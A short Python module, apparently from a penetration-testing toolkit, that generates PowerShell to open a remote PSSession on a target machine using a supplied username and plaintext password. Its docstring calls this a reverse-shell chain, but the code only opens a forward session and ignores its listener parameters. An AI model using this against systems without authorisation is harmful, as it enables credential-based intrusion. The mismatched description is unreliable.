#!/usr/bin/python3
from textwrap import dedent
from shells import Shells
from connection import Connection

class PSSession(Connection):
    @staticmethod
    def get_ps(username: str, password: str, target_ip: str, 
               listen_address: str, listen_port: str) -> str:
        """
        Build and return a PowerShell chain for a reverse shell.
        """

        # Build PowerShell dynamically from args
        ps = dedent(f"""\
        $username = '{username}';
        $password = '{password}';
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

        New-PSSession -ComputerName {target_ip} -Credential $credential

        Write-Host Remember to Enter-PSSession SESSION_NUMBER
        """)

        return ps
